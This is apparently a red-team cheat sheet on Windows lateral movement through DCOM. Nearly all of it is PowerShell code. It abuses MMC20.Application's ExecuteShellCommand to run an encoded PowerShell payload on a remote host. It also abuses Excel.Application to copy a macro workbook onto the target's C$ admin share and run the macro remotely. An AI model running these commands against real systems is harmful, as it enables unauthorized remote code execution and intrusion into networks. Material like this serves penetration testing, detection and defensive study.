# Living off the Land

## 01 - Powershell

### 1.1 - MMC20.Application

```powershell
C:\> powershell -exec bypass -command "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '<IP>')).Document.ActiveView.ExecuteShellCommand('C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe', $null, '-E <base64_payload>', '7')"

PS C:\> [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '<IP>')).Document.ActiveView.ExecuteShellCommand('C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe', $null, '-E <base64_payload>', '7')
```

### 1.2 - Excel.Application

```powershell
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))
$com | Get-Member
```

`$ cat macro.vba`

---

```vbscript
Sub mymacro()
    'payload goes here
    Shell ("notepad.exe")
End Sub
```

`$ cat copyexceldcom.ps1`

---

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))

$LocalPath = "path\to\excelmacrofile.xls"

$RemotePath = "\\<IP>\C$\excelmacrofile.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

`$ cat openexceldcom.ps1`

---

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))

$LocalPath = "C:\path\to\excelmacrofile.xls"

$RemotePath = "\\<IP>\C$\excelmacrofile.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

# When running as system adminstrator privileges
$Path = "\\<IP>\C$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [System.IO.Directory]::CreateDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\excelmacrofile.xls")

$com.Run("mymacro")
```

---
## References

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)